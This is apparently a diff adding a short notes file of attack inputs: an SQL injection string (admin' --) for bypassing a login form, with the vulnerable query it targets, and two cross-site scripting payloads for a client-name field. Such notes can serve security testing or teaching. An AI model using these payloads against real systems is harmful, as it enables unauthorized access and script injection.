@@ -1,0 +1,11 @@
+SQLi, use in login form as username:
+username: admin' --
+password: can be any password
+
+Because query:
+SELECT user_data FROM users WHERE username = 'username' AND password_hash = 'password_hash'
+
+
+XSS, use in client name:
+<script>alert("YOU WERE HACKED")</script>
+<b style="color:red">HACKED!</b>
